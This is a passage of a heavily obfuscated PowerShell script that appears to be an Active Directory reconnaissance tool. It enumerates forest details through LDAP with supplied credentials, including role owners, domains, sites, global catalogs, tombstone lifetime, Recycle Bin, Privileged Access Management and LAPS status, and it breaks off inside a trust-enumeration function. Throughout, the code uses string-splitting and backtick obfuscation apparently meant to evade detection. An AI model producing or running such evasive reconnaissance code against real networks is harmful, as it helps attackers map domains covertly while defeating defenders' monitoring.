                    ${O`Bj} | &("{1}{2}{0}"-f'er','Add','-Memb') -MemberType ("{2}{3}{0}{1}" -f 'ert','y','No','teProp') -Name ("{0}{1}" -f'Val','ue') -Value ("{0}{1}" -f'Enable','d')
                    ${fo`Re`Sto`BJ} += ${o`BJ}
                    For(${i}=0; ${i} -lt $(${prIVILEgEd`ACCE`SS`MaNA`Ge`me`Nt}."eN`Ab`lEdsCOPES"."c`Ount"); ${I}++)
                    {
                        ${O`Bj} = &("{2}{1}{0}" -f't','jec','New-Ob') ("{1}{2}{0}" -f 't','PSObje','c')
                        ${O`Bj} | &("{0}{1}{2}"-f 'Add-Mem','b','er') -MemberType ("{0}{3}{1}{2}"-f 'N','eProp','erty','ot') -Name ("{2}{0}{1}"-f'eg','ory','Cat') -Value ("{0}{1}{2}{3}" -f'E','nabled ','S','cope')
                        ${O`BJ} | &("{0}{2}{1}{3}"-f 'Add-M','b','em','er') -MemberType ("{0}{3}{1}{2}"-f'No','roper','ty','teP') -Name ("{0}{1}" -f'Val','ue') -Value ${PrIv`Ile`g`EdACces`sMAn`A`G`Eme`Nt}."ENaBlEd`S`CoPES"[${i}]
                        ${FO`ReSt`oBj} += ${O`Bj}
                    }
                }
                Else
                {
                    ${o`BJ} | &("{2}{1}{0}"-f'Member','-','Add') -MemberType ("{0}{1}{2}"-f'Not','e','Property') -Name ("{1}{0}"-f 'e','Valu') -Value ("{0}{2}{1}"-f'Dis','d','able')
                    ${fORE`St`ObJ} += ${o`Bj}
                }
                &("{0}{4}{2}{1}{3}"-f 'Re','l','ve-Variab','e','mo') ("{4}{2}{3}{1}{6}{5}{0}"-f 'agement','Acce','rivileg','ed','P','an','ssM')
            }
            Else
            {
                ${o`Bj} | &("{0}{2}{1}{3}"-f 'Ad','-M','d','ember') -MemberType ("{1}{2}{0}{3}"-f'r','NotePr','ope','ty') -Name ("{1}{0}" -f'ue','Val') -Value ("{2}{1}{0}"-f 'd','le','Disab')
                ${Fo`ReS`TOBj} += ${O`BJ}
            }

            ${O`BJ} = &("{0}{1}{2}"-f 'New-Ob','je','ct') ("{0}{1}{2}" -f'PS','Objec','t')
            ${O`BJ} | &("{1}{2}{0}" -f'r','Ad','d-Membe') -MemberType ("{0}{1}{2}" -f 'No','teP','roperty') -Name ("{1}{0}"-f'egory','Cat') -Value ("{0}{1}"-f 'LAP','S')
            If (${A`drlAP`SCHEcK})
            {
                ${o`BJ} | &("{1}{2}{0}" -f 'ber','A','dd-Mem') -MemberType ("{2}{3}{1}{0}" -f 'perty','ro','Not','eP') -Name ("{1}{0}"-f'e','Valu') -Value ("{1}{0}"-f 'led','Enab')
                ${FOREST`O`BJ} += ${o`BJ}

                ${o`Bj} = &("{1}{2}{0}" -f 'ject','N','ew-Ob') ("{0}{2}{1}" -f 'PSO','ect','bj')
                ${o`Bj} | &("{3}{2}{0}{1}" -f'be','r','d-Mem','Ad') -MemberType ("{3}{2}{1}{0}"-f'y','pert','ro','NoteP') -Name ("{0}{2}{1}" -f'Cate','ry','go') -Value ("{3}{0}{1}{4}{2}"-f'S',' I','d Date','LAP','nstalle')
                ${o`BJ} | &("{2}{1}{0}"-f 'er','emb','Add-M') -MemberType ("{3}{0}{1}{2}"-f'o','teP','roperty','N') -Name ("{0}{1}" -f 'Va','lue') -Value $((&("{0}{2}{1}"-f 'Get-ADO','ject','b') "CN=ms-Mcs-AdmPwd,$((Get-ADRootDSE).schemaNamingContext)" -Properties ("{0}{1}{2}" -f'wh','en','Created'))."wh`ENC`ReaTed")
                ${f`o`ResTOBJ} += ${o`Bj}
            }
            Else
            {
                ${O`Bj} | &("{0}{2}{1}{3}"-f'Ad','-','d','Member') -MemberType ("{0}{2}{1}" -f 'N','y','otePropert') -Name ("{0}{1}"-f 'V','alue') -Value ("{2}{1}{0}" -f'ed','sabl','Di')
                ${F`Ores`TOBJ} += ${o`BJ}
            }

            &("{4}{3}{0}{2}{1}" -f 'Varia','e','bl','emove-','R') ("{0}{2}{1}"-f'ADFor','t','es')
        }
    }

    If (${ME`T`hOd} -eq ("{0}{1}" -f'LDA','P'))
    {
        If (${CRE`denTI`Al} -ne   $CLf0n::"e`Mpty")
        {
            ${domAiNf`q`dN} = &("{0}{2}{3}{1}"-f 'Get-DN','DN','t','oFQ')(${Obj`Do`maIn}."disTin`guis`hedn`Ame")
            ${doM`AiNc`ONtext} = &("{2}{1}{0}" -f 'Object','ew-','N') ("{7}{5}{12}{10}{4}{3}{0}{8}{9}{11}{6}{1}{2}" -f 'A','c','toryContext','ices.','v','.Di','e','System','cti','veDir','ectorySer','ectory.Dir','r')(("{0}{1}" -f'Do','main'),$(${DomA`I`NFq`DN}),$(${Cr`Ede`Nti`Al}."uSErNA`ME"),$(${CREde`Nt`IAl}.("{3}{2}{1}{0}{4}" -f 'workCre','t','tNe','Ge','dential').Invoke()."PaSsW`ord"))
            Try
            {
                ${a`D`domAIn} =  (VArIABLE ux5M -VAlUE)::("{1}{2}{0}" -f'ain','G','etDom').Invoke(${d`OMAiN`CoNte`xt})
            }
            Catch
            {
                &("{2}{1}{0}{3}"-f'e-Warn','t','Wri','ing') ("{7}{1}{2}{4}{3}{5}{0}{8}{6}" -f '] Error getting D','t-','A','Fore','DR','st','Context','[Ge','omain ')
                &("{0}{1}{2}{3}" -f 'Wri','t','e-Verbos','e') "[EXCEPTION] $($_.Exception.Message) "
                Return ${Nu`Ll}
            }
            &("{1}{0}{3}{2}"-f'Var','Remove-','e','iabl') ("{0}{1}{3}{2}" -f 'Do','m','ontext','ainC')

            ${f`O`R`E`StCOntExT} = &("{2}{3}{1}{0}" -f'ect','bj','New-','O') ("{0}{8}{5}{9}{6}{7}{4}{2}{3}{1}" -f'Sys','ectoryContext','ctory','.Dir','Dire','ectoryServices.','ti','ve','tem.Dir','Ac')(("{0}{1}" -f'For','est'),$(${aDd`OmA`In}."fo`Rest"),$(${Cr`E`dENtIAl}."u`ser`Name"),$(${CR`ED`enTIal}.("{2}{1}{3}{0}{6}{5}{4}"-f 'r','e','GetN','two','ential','d','kCre').Invoke()."P`As`sWorD"))
            &("{4}{1}{2}{3}{0}"-f 'iable','ov','e-V','ar','Rem') ("{0}{1}{2}"-f 'ADD','om','ain')
            Try
            {
                ${ADFO`RE`St} =   $WVlF::("{0}{1}{2}" -f'Ge','tFo','rest').Invoke(${FO`R`EsTConT`E`Xt})
            }
            Catch
            {
                &("{1}{3}{2}{0}" -f'g','W','arnin','rite-W') ("{9}{5}{3}{7}{0}{6}{8}{2}{11}{4}{10}{1}" -f't]','xt','ting ','RFo','st C','Get-AD',' Er','res','ror get','[','onte','Fore')
                &("{2}{0}{1}" -f'i','te-Verbose','Wr') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`ULl}
            }
            &("{4}{1}{3}{0}{2}" -f'ariab','emov','le','e-V','R') ("{1}{2}{0}"-f 'text','Fo','restCon')

            
            Try
            {
                ${seAR`chp`AtH} = ("{2}{5}{7}{3}{0}{4}{1}{6}" -f'ervice,CN','T,CN=Service','CN=D','y S','=Windows N','irecto','s','r')
                ${OBJ`s`earC`Hpa`Th} = &("{1}{2}{0}"-f 'ject','New-O','b') ("{3}{10}{2}{7}{0}{9}{6}{1}{4}{5}{8}" -f 'toryService','ec','D','Sys','tory','Ent','Dir','irec','ry','s.','tem.') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", ${C`Red`e`NtIAl}."u`seRnAme",${C`RedENt`i`AL}.("{3}{1}{0}{2}" -f 'tia','n','l','GetNetworkCrede').Invoke()."PAS`swo`RD"
                ${O`B`j`sEaR`chErPaTh} = &("{0}{2}{1}"-f 'New','Object','-') ("{0}{3}{9}{1}{8}{4}{10}{2}{5}{6}{7}" -f 'Syst','rector','ices.D','em','Ser','ire','ctor','ySearcher','y','.Di','v') ${oBjs`EaRChp`AtH}
                ${objsEA`R`CHE`Rp`AtH}."FiL`TEr"=("{3}{1}{0}{2}{5}{6}{4}"-f 'e=Di','nam','rectory Ser','(',')','vic','e')
                ${oB`JS`Ea`RcHERREs`ULt} = ${oBj`s`e`ArCherpATh}.("{1}{0}" -f 'dAll','Fin').Invoke()
                ${ADfOreST`T`oMBst`o`N`E`LIF`etimE} = ${oBJSe`ArC`He`R`Re`sulT}."p`RO`pERTIEs"."TO`Mbs`TONelI`FEtime"
                &("{0}{1}{4}{3}{2}"-f'Remo','ve-','e','l','Variab') ("{3}{1}{0}{2}" -f'arc','e','hPath','S')
                ${O`BJSEARCHp`ATh}.("{2}{0}{1}"-f 'is','pose','D').Invoke()
                ${O`B`js`EARCHeRPa`Th}.("{1}{0}" -f'se','Dispo').Invoke()
                ${objseA`Rc`h`E`RRe`SULT}.("{0}{1}"-f'Di','spose').Invoke()
            }
            Catch
            {
                &("{1}{2}{3}{0}" -f'arning','Writ','e-','W') ("{6}{0}{9}{11}{5}{8}{4}{2}{7}{1}{12}{10}{3}" -f 'A','ng Tom','or ','time','rr','e','[Get-','retrievi','st] E','D','Life','RFor','bstone ')
                &("{0}{2}{1}{3}"-f'W','ite','r','-Verbose') "[EXCEPTION] $($_.Exception.Message) "
            }
            
            If (  $ASCouG::("{2}{0}{1}" -f 'nt','32','ToI').Invoke(${O`BJDO`mAInro`OTDse}."f`oRestF`UNCTi`ONAlITY",10) -ge 4)
            {
                Try
                {
                    ${sE`ARCh`paTH} = ("{13}{20}{22}{28}{11}{8}{25}{19}{12}{9}{18}{3}{4}{0}{16}{27}{6}{24}{21}{26}{14}{7}{1}{15}{5}{2}{10}{23}{17}"-f 'N=Dire','c','CN=C','ures',',C',',',' Servi','vi',' ','io','o',' Bin','N=Opt','CN=R','Ser','es','ctor','ion','nal Feat','ature,C','ec','ndows','ycl','nfigurat','ce,CN=Wi','Fe',' NT,CN=','y','e')
                    ${AD`RECyc`L`eBiN} = &("{2}{1}{0}{3}"-f 'e','-Obj','New','ct') ("{6}{2}{4}{3}{5}{7}{0}{1}" -f 'ryEn','try','stem.Di','rvi','rectorySe','ces.Di','Sy','recto') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${cRED`e`NTiAl}."UseRn`AME", ${C`R`e`deNTiaL}.("{0}{4}{3}{5}{1}{2}"-f'Ge','Credenti','al','wor','tNet','k').Invoke()."P`AssWo`Rd"
                    &("{3}{0}{2}{1}"-f 'Var','able','i','Remove-') ("{2}{0}{1}"-f'Pa','th','Search')
                }
                Catch
                {
                    &("{1}{0}{2}"-f'-Warnin','Write','g') ("{5}{0}{4}{6}{7}{1}{2}{3}{8}" -f 't] ','g Re','cyc','le Bin','Error retri','[Get-ADRFores','ev','in',' Feature')
                    &("{0}{2}{1}{4}{3}" -f'Wr','te-Ver','i','se','bo') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            
            If (  $AsCOuG::("{0}{1}"-f 'ToI','nt32').Invoke(${OB`JdO`MAinROOT`dSE}."FoRe`sT`FuN`C`TiON`AliTy",10) -ge 7)
            {
                Try
                {
                    ${Se`ARchP`Ath} = ("{10}{18}{5}{8}{6}{19}{14}{15}{17}{4}{11}{16}{3}{13}{20}{9}{0}{7}{12}{2}{1}" -f'vices,','uration','ig','ctory ','e','d A','a','CN=','ccess M','CN=Ser','CN=Priv','atures,C','Conf','Service,CN=Windows N',' Feature,CN=Optional',' ','N=Dire','F','ilege','nagement','T,')
                    ${Pri`VIL`eg`ED`AC`cEs`sMA`NaGEmeNT} = &("{2}{0}{1}" -f 'bj','ect','New-O') ("{8}{9}{4}{1}{5}{6}{11}{0}{7}{3}{2}{10}" -f'i','recto','ryE','cto','.Di','rySe','r','ces.Dire','Syste','m','ntry','v') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${C`REDE`NtiaL}."u`SERN`Ame", ${creDen`T`ial}.("{3}{4}{0}{1}{2}" -f 'nt','i','al','GetNetworkCre','de').Invoke()."P`ASSWORd"
                    &("{1}{2}{3}{4}{0}" -f'e','Remo','v','e-','Variabl') ("{0}{1}{2}"-f 'Sear','c','hPath')
                }
                Catch
                {
                    &("{1}{0}{3}{2}"-f 'ite-','Wr','ng','Warni') ("{0}{4}{3}{12}{10}{5}{13}{6}{11}{7}{1}{9}{8}{2}"-f '[Get',' Manag','t Feature','r','-ADRForest] Error ret','ng ','r','cess','men','e','i','ivileged Ac','iev','P')
                    &("{1}{2}{0}" -f '-Verbose','W','rite') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            ${A`dDo`mAiN} =  ( DiR  vaRIaBLE:UX5M  ).VAlUe::("{2}{3}{1}{0}"-f 'tDomain','ren','Get','Cur').Invoke()
            ${A`dFOR`Est} =  (  VArIAbLE  ("WVl"+"F")  -vaLuEo )::("{2}{0}{1}{3}"-f'etCurren','tF','G','orest').Invoke()

            
            ${aDFoReS`TtomBsTo`NEl`Ife`TiME} = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ")."tombS`T`oNE`lIfe`T`IME"."VA`Lue"

            
            If ( $AsCoUG::("{0}{1}{2}"-f 'T','oI','nt32').Invoke(${oB`jDOMAinR`OotD`sE}."FOrEs`Tf`UnCTiO`Nali`TY",10) -ge 4)
            {
                ${AD`RECyC`LEBIN} = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            
            If ( ( GET-Item  ("v"+"arIaB"+"L"+"e:A"+"Scoug") ).VaLUe::("{0}{1}" -f'T','oInt32').Invoke(${ObjdOm`AiN`RooT`dse}."FoR`Es`TFuN`cT`iona`lItY",10) -ge 7)
            {
                ${P`Riv`iL`egEdacC`eSSma`NAgE`mENt} = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        
        ${Adrl`A`pS`Check} = &("{2}{0}{3}{1}"-f'AD','heck','Get-','RLAPSC') -Method ("{0}{1}" -f 'LDA','P') -objDomainRootDSE ${ob`j`dOM`AiNROoTdse} -DomainController ${doMA`In`c`ONTRolL`er} -Credential ${CrE`DEn`Tial}

        If (${AdfO`R`EsT})
        {
            ${F`Or`EST`oBJ} = @()

            
            ${fl`Ad} = @{
	            0 = ("{1}{2}{0}{3}" -f 'ndo','W','i','ws2000');
	            1 = ("{2}{0}{1}{3}"-f 'ndow','s2003/In','Wi','terim');
	            2 = ("{0}{1}{2}"-f 'Wi','ndows2','003');
	            3 = ("{1}{3}{0}{2}"-f's20','Wind','08','ow');
	            4 = ("{2}{0}{1}"-f 'ndow','s2008R2','Wi');
	            5 = ("{2}{0}{1}"-f 's2','012','Window');
	            6 = ("{2}{1}{0}{3}" -f'012R','2','Windows','2');
                7 = ("{2}{3}{0}{1}" -f'do','ws2016','Wi','n')
            }
            ${f`OReStmO`dE} = ${FL`AD}[ ( gET-CHIlDIteM ('vA'+'rIABLe:asC'+'O'+'ug')  ).vALUE::("{2}{1}{0}"-f '2','Int3','To').Invoke(${oBjd`oM`A`INro`oTDse}."f`or`EsTf`UncTiON`AlitY",10)] + ("{0}{1}" -f'Fore','st')
            &("{4}{3}{2}{1}{0}" -f'ariable','ve-V','mo','e','R') ("{1}{0}" -f'D','FLA')

            ${oBJvA`L`UES} = @(("{1}{0}"-f 'me','Na'), ${adfoR`E`sT}."NA`mE", ("{2}{1}{4}{0}{3}" -f've','ncti','Fu','l','onal Le'), ${F`OR`EsTm`ODe}, ("{2}{3}{5}{1}{0}{4}" -f 'n ','ai','D','o','Naming Master','m'), ${a`d`FOreST}."nAmiN`GR`O`LeoWNEr", ("{3}{0}{1}{2}"-f' ','Mast','er','Schema'), ${aD`Fore`st}."sCH`EMArol`E`OWN`Er", ("{0}{2}{1}"-f'Ro','ain','otDom'), ${ad`FOrE`st}."Ro`ot`d`Omain", ("{3}{0}{2}{1}" -f 'ain C','nt','ou','Dom'), ${aDf`OR`EST}."do`m`AINS"."CoU`NT", ("{1}{2}{3}{0}"-f 'unt','S','ite C','o'), ${AdFO`Re`st}."sit`ES"."CO`Unt", ("{2}{1}{0}{3}" -f 'C','al Catalog ','Glob','ount'), ${AD`F`Orest}."GloBAl`ca`TaL`oGs"."C`ount")

            For (${I} = 0; ${i} -lt $(${OBjva`L`Ues}."COu`NT"); ${I}++)
            {
                ${O`Bj} = &("{2}{0}{1}"-f'-Obj','ect','New') ("{1}{2}{0}"-f 'ject','P','SOb')
                ${o`BJ} | &("{0}{2}{1}" -f'Add-','r','Membe') -MemberType ("{1}{0}{2}"-f'oper','NotePr','ty') -Name ("{1}{2}{0}"-f 'ry','Ca','tego') -Value ${ob`JvaLu`ES}[${i}]
                ${O`BJ} | &("{0}{2}{3}{1}"-f'Add-M','ber','e','m') -MemberType ("{2}{3}{1}{0}" -f'operty','r','Not','eP') -Name ("{1}{0}"-f 'e','Valu') -Value ${o`B`jvaLU`eS}[${i}+1]
                ${i}++
                ${fO`RE`StoBj} += ${O`BJ}
            }
            &("{1}{0}{3}{2}" -f'v','Remo','Variable','e-') ("{0}{3}{2}{1}" -f 'F','stMode','re','o')

            For(${I}=0; ${i} -lt ${adfo`R`e`sT}."Dom`AIns"."c`ouNT"; ${i}++)
            {
                ${o`Bj} = &("{0}{1}{2}"-f'Ne','w-Obje','ct') ("{2}{0}{1}"-f'c','t','PSObje')
                ${O`BJ} | &("{1}{0}{2}" -f '-Mem','Add','ber') -MemberType ("{1}{2}{0}" -f 'perty','NoteP','ro') -Name ("{1}{0}"-f'egory','Cat') -Value ("{1}{0}"-f'n','Domai')
                ${o`BJ} | &("{1}{2}{0}" -f 'ber','Add-','Mem') -MemberType ("{0}{2}{1}"-f'NoteProp','ty','er') -Name ("{0}{1}"-f 'Valu','e') -Value ${ad`Fo`R`est}."DOmAi`NS"[${i}]
                ${F`OrE`s`Tobj} += ${O`BJ}
            }
            For(${i}=0; ${i} -lt ${a`dfORE`sT}."SI`TES"."co`UNt"; ${i}++)
            {
                ${O`Bj} = &("{0}{1}{2}" -f'New','-O','bject') ("{0}{1}{2}" -f 'PSO','bje','ct')
                ${o`Bj} | &("{1}{0}{2}" -f'd-Me','Ad','mber') -MemberType ("{1}{0}{2}" -f'tePro','No','perty') -Name ("{1}{2}{0}" -f 'egory','C','at') -Value ("{1}{0}"-f'e','Sit')
                ${O`Bj} | &("{2}{1}{0}" -f 'er','dd-Memb','A') -MemberType ("{0}{3}{2}{1}"-f'Not','rty','pe','ePro') -Name ("{1}{0}"-f 'e','Valu') -Value ${ADFo`ReST}."SI`TEs"[${I}]
                ${F`Oresto`BJ} += ${O`Bj}
            }
            For(${I}=0; ${i} -lt ${AD`F`oRest}."gLObaL`caT`A`lo`Gs"."cOU`Nt"; ${i}++)
            {
                ${O`BJ} = &("{3}{2}{0}{1}"-f '-Obje','ct','w','Ne') ("{2}{1}{0}"-f'ct','e','PSObj')
                ${o`BJ} | &("{1}{0}{2}"-f'm','Add-Me','ber') -MemberType ("{1}{3}{2}{0}"-f 'ty','NotePr','per','o') -Name ("{1}{0}" -f 'ry','Catego') -Value ("{0}{2}{1}" -f 'GlobalC','talog','a')
                ${O`BJ} | &("{2}{1}{0}"-f 'ber','Mem','Add-') -MemberType ("{1}{2}{3}{0}" -f'erty','No','t','eProp') -Name ("{1}{0}"-f 'lue','Va') -Value ${a`DFo`RE`st}."g`lO`BA`lc`ATaLOGs"[${I}]
                ${F`oREstO`BJ} += ${o`BJ}
            }

            ${o`BJ} = &("{0}{2}{1}" -f 'N','-Object','ew') ("{0}{2}{1}" -f'P','t','SObjec')
            ${O`BJ} | &("{3}{2}{1}{0}"-f 'ber','m','Me','Add-') -MemberType ("{0}{2}{1}" -f'Not','perty','ePro') -Name ("{2}{0}{1}" -f 'egor','y','Cat') -Value ("{3}{2}{0}{1}"-f'one L','ifetime','t','Tombs')
            If (${aDF`OR`eStto`MBSt`ONE`l`iFEtIME})
            {
                ${O`BJ} | &("{0}{1}{2}"-f'Add','-Me','mber') -MemberType ("{1}{0}{2}"-f 'op','NotePr','erty') -Name ("{1}{0}"-f'lue','Va') -Value ${ADfoRESt`T`O`MBSTO`Ne`Lifet`i`ME}
                &("{4}{3}{2}{1}{0}"-f'Variable','ve-','o','em','R') ("{3}{0}{4}{1}{2}{5}{6}" -f'Fore','t','Tombst','AD','s','oneLife','time')
            }
            Else
            {
                ${o`BJ} | &("{2}{1}{0}" -f'r','d-Membe','Ad') -MemberType ("{0}{1}{2}"-f'NotePr','oper','ty') -Name ("{0}{1}" -f'Val','ue') -Value ("{3}{1}{0}{2}" -f've','t Retrie','d','No')
            }
            ${f`orE`sTOBj} += ${O`BJ}

            ${o`BJ} = &("{0}{1}{2}" -f'N','ew-Objec','t') ("{1}{0}{2}"-f 'bj','PSO','ect')
            ${O`Bj} | &("{2}{1}{0}"-f'ber','dd-Mem','A') -MemberType ("{1}{3}{2}{0}" -f'ty','Note','r','Prope') -Name ("{0}{1}" -f 'Cate','gory') -Value ("{3}{4}{6}{1}{2}{0}{5}{7}"-f '08','le Bin (2','0','R','ecy',' R2 onward','c','s)')
            If (${adrECY`CL`eBIn})
            {
                If (${adr`Ec`YCLEBIn}."p`Ro`pertieS".'msds-enabledfeaturebl'."COu`Nt" -gt 0)
                {
                    ${o`Bj} | &("{1}{0}{2}"-f'd','Ad','-Member') -MemberType ("{1}{3}{0}{2}" -f 'Proper','No','ty','te') -Name ("{1}{0}" -f 'e','Valu') -Value ("{0}{1}"-f'Enab','led')
                    ${foREST`O`Bj} += ${o`Bj}

                    ${o`Bj} = &("{2}{1}{3}{0}" -f 'bject','e','N','w-O') ("{2}{1}{0}"-f 't','Objec','PS')
                    ${O`BJ} | &("{0}{2}{1}" -f 'Add','r','-Membe') -MemberType ("{0}{1}{2}"-f'Not','eProp','erty') -Name ("{1}{0}" -f'egory','Cat') -Value ("{5}{2}{0}{6}{4}{1}{7}{3}"-f'le B',' ','c','e','n Enabled','Recy','i','Dat')
                    ${o`Bj} | &("{1}{2}{3}{0}" -f 'ber','A','dd-M','em') -MemberType ("{0}{2}{1}"-f 'NoteP','ty','roper') -Name ("{0}{1}"-f 'Val','ue') -Value ${Adrec`y`ClE`B`IN}."WhE`NCReat`eD"."V`AluE"
                    ${Fo`ResTO`BJ} += ${O`Bj}

                    For(${i}=0; ${I} -lt $(${ad`Re`Cyc`lEb`iN}."prop`ERt`i`ES".'msds-enabledfeaturebl'."c`oUNT"); ${I}++)
                    {
                        ${O`Bj} = &("{2}{0}{1}" -f '-','Object','New') ("{0}{1}" -f 'PS','Object')
                        ${o`BJ} | &("{2}{1}{0}"-f 'r','e','Add-Memb') -MemberType ("{1}{2}{0}" -f 'ty','Note','Proper') -Name ("{0}{2}{1}"-f'Catego','y','r') -Value ("{2}{1}{3}{4}{0}"-f'e','led','Enab',' S','cop')
                        ${o`BJ} | &("{1}{0}{2}" -f 'dd-Membe','A','r') -MemberType ("{0}{2}{1}"-f 'N','y','otePropert') -Name ("{0}{1}"-f 'Val','ue') -Value ${ad`ReCyCle`BIN}."prOP`eRt`ies".'msds-enabledfeaturebl'[${i}]
                        ${fo`R`e`stOBj} += ${O`Bj}
                    }
                }
                Else
                {
                    ${o`Bj} | &("{2}{0}{1}"-f'emb','er','Add-M') -MemberType ("{2}{1}{0}" -f'erty','teProp','No') -Name ("{0}{1}"-f 'Va','lue') -Value ("{2}{1}{0}" -f 'led','ab','Dis')
                    ${f`O`REsTOBJ} += ${O`Bj}
                }
                ${ADRE`c`y`cl`EBIn}.("{2}{1}{0}" -f'e','os','Disp').Invoke()
            }
            Else
            {
                ${O`Bj} | &("{0}{1}{2}"-f'A','dd-M','ember') -MemberType ("{1}{2}{0}" -f'roperty','Not','eP') -Name ("{1}{0}" -f 'ue','Val') -Value ("{2}{0}{1}" -f 'ab','led','Dis')
                ${F`OREst`OBj} += ${o`BJ}
            }

            ${o`BJ} = &("{2}{1}{0}"-f 'ject','-Ob','New') ("{1}{0}" -f'bject','PSO')
            ${o`BJ} | &("{1}{0}{2}{3}"-f 'dd-M','A','emb','er') -MemberType ("{1}{2}{0}"-f'rty','NotePr','ope') -Name ("{0}{1}{2}"-f 'Ca','tego','ry') -Value ("{2}{4}{0}{3}{5}{1}{6}{7}" -f'leged ','t (201','P','Acce','rivi','ss Managemen','6',' onwards)')
            If (${priv`il`E`G`ED`AcceSsManAgemE`Nt})
            {
                If (${p`Ri`V`iLegEdAcCEssManAGem`E`Nt}."PR`opert`ieS".'msDS-EnabledFeatureBL'."COu`Nt" -gt 0)
                {
                    ${O`Bj} | &("{0}{1}{2}" -f 'Ad','d-','Member') -MemberType ("{3}{0}{1}{2}" -f'eProp','er','ty','Not') -Name ("{0}{1}" -f'Valu','e') -Value ("{0}{1}" -f 'E','nabled')
                    ${f`O`RESt`oBj} += ${o`BJ}
                    For(${i}=0; ${i} -lt $(${pRiV`i`leGeD`AcCessmanA`g`em`Ent}."Pr`o`Per`TIES".'msDS-EnabledFeatureBL'."Co`Unt"); ${I}++)
                    {
                        ${O`BJ} = &("{2}{1}{0}{3}" -f 'O','-','New','bject') ("{2}{1}{0}"-f 'ct','SObje','P')
                        ${o`BJ} | &("{3}{0}{2}{1}" -f 'M','r','embe','Add-') -MemberType ("{3}{1}{0}{2}"-f 'op','r','erty','NoteP') -Name ("{0}{1}{2}" -f'Ca','t','egory') -Value ("{0}{3}{2}{1}" -f 'E','led Scope','b','na')
                        ${o`Bj} | &("{1}{2}{0}" -f 'er','Add','-Memb') -MemberType ("{0}{1}{2}" -f'Note','Prop','erty') -Name ("{1}{0}"-f 'ue','Val') -Value ${PrIV`Il`e`GedaCCES`Smanagem`eNT}."P`RO`peRtIes".'msDS-EnabledFeatureBL'[${i}]
                        ${for`E`sToBj} += ${o`BJ}
                    }
                }
                Else
                {
                    ${o`Bj} | &("{0}{2}{1}"-f'Add','er','-Memb') -MemberType ("{3}{1}{2}{0}" -f 'rty','Prop','e','Note') -Name ("{1}{0}" -f'lue','Va') -Value ("{1}{0}"-f 'abled','Dis')
                    ${Fo`REs`TobJ} += ${o`Bj}
                }
                ${pRI`ViLE`GeDAc`CeSsm`AN`AgEM`E`NT}.("{1}{0}"-f'ispose','d').Invoke()
            }
            Else
            {
                ${O`BJ} | &("{3}{1}{2}{0}"-f 'er','dd-Mem','b','A') -MemberType ("{2}{1}{3}{0}" -f'roperty','ot','N','eP') -Name ("{1}{0}"-f 'e','Valu') -Value ("{2}{0}{1}"-f'able','d','Dis')
                ${fo`ReSTO`BJ} += ${O`Bj}
            }

            ${O`BJ} = &("{1}{0}{2}" -f '-','New','Object') ("{2}{0}{1}"-f'Obje','ct','PS')
            ${O`BJ} | &("{2}{0}{1}{3}"-f 'dd-M','embe','A','r') -MemberType ("{2}{1}{3}{0}" -f 'ty','r','NoteP','oper') -Name ("{1}{0}{2}"-f 'tego','Ca','ry') -Value ("{0}{1}" -f'LAP','S')
            If (${AdR`LA`pScH`EcK})
            {
                ${O`Bj} | &("{2}{1}{0}"-f 'ember','-M','Add') -MemberType ("{0}{2}{1}" -f 'Note','roperty','P') -Name ("{1}{0}" -f'alue','V') -Value ("{1}{0}" -f 'bled','Ena')
                ${f`OReST`oBJ} += ${O`Bj}

                ${O`Bj} = &("{2}{0}{1}"-f 'Objec','t','New-') ("{1}{0}{2}" -f'b','PSO','ject')
                ${O`BJ} | &("{0}{2}{1}" -f'Add','mber','-Me') -MemberType ("{0}{1}{2}" -f 'NoteProp','er','ty') -Name ("{0}{1}{2}" -f'Categ','or','y') -Value ("{0}{3}{2}{5}{1}{4}"-f 'LAP',' D','a','S Inst','ate','lled')
                If (${crED`ENti`Al} -ne   (  geT-VArIAbLe CLF0n ).VaLUe::"e`Mpty")
                {
                    ${a`DrLa`ps`INs`TA`lLeDdate} = (&("{0}{1}{2}" -f'New-O','bjec','t') ("{3}{4}{10}{5}{6}{7}{9}{2}{0}{8}{1}"-f'E','y','Directory','System.','D','re','c','toryServi','ntr','ces.','i') "LDAP://$($DomainController)/CN=ms-Mcs-AdmPwd,$($objDomainRootDSE.schemaNamingContext)", ${Cr`e`DENTI`AL}."UsERN`AME", ${Cr`edE`NTIAl}.("{4}{1}{5}{2}{3}{0}"-f'l','tNe','rkC','redentia','Ge','two').Invoke()."paSsW`O`RD")."w`hEN`CrEA`TeD"."VA`lue"
                }
                Else
                {
                    ${AdrlAP`siNstaLLEd`Da`Te} = ([ADSI]("LDAP://CN=ms-Mcs-AdmPwd,$($objDomainRootDSE.schemaNamingContext)"))."whENcRe`AT`ed"."Val`UE"
                }
                ${O`Bj} | &("{1}{2}{0}" -f'Member','A','dd-') -MemberType ("{2}{1}{0}" -f'y','ePropert','Not') -Name ("{1}{0}" -f 'alue','V') -Value ${AdrLApS`iNsT`ALL`eDDATE}
                ${FOrE`sT`obj} += ${O`BJ}
                &("{3}{2}{4}{0}{1}" -f 'abl','e','ov','Rem','e-Vari') ("{5}{0}{1}{3}{4}{2}"-f 'RLAPSInsta','lle','e','dDa','t','AD')
            }

            &("{1}{3}{0}{2}"-f'Variabl','Rem','e','ove-') ("{0}{1}" -f'ADF','orest')
        }
    }

    If (${FOr`ES`TOBJ})
    {
        Return ${f`oRES`T`obJ}
    }
    Else
    {
        Return ${n`ULL}
    }
}

Function geT`-ADRt`R`USt
{

    param(
        [Parameter(mandatoRY = ${TR`Ue})]
        [string] ${m`etHoD},

        [Parameter(ManDAtorY = ${fa`lSE})]
        [DirectoryServices.DirectoryEntry] ${O`BJDO`Ma`in}
    )

    
    ${t`daD} = @{
        0 = ("{0}{2}{1}" -f 'D','sabled','i');
        1 = ("{1}{0}{2}"-f 'b','In','ound');
